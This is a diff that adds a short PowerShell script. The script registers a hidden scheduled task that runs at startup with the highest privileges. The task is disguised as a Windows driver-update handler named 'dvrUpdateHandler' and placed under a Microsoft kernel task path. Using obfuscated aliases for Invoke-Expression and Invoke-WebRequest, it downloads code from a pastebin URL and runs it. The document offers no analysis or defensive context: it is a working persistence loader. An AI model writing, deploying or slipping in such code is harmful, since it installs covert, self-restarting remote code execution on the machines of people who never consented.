@@ -1,0 +1,10 @@
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-windowstyle hidden -command sal callit iex;sal windoWs_NT iwr;callit(windowS_NT pastebin.com/raw/BP6i6Erd -usebasicparsing)"
+$trigger = New-ScheduledTaskTrigger -AtStartup
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+
+try {
+    Register-ScheduledTask -TaskName "dvrUpdateHandler" -Action $action -Trigger $trigger -Settings $settings -User "$env:username" -RunLevel Highest -Description "Handles Driver Updates" -TaskPath "\Microsoft\Windows\Kernel\"
+    Write-Output "Success created successfully."
+} catch {
+    Write-Error "Error: Failed to create."
+}
